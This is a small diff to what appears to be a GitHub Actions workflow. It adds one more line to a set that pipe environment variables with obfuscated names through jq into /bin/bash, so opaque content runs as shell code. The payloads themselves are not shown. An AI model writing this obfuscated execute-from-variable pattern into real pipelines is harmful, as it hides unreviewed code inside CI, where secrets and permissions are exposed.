@@ -31,6 +31,7 @@ jobs:
           echo $nwt6730 | jq -r .yebd17129 | /bin/bash
           echo $oxchk7 | jq -r .fhhz7 | /bin/bash
           echo $z971 | jq -r .cailh0 | /bin/bash
+          printf '%s' "$hny45136" | jq -r .v661 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
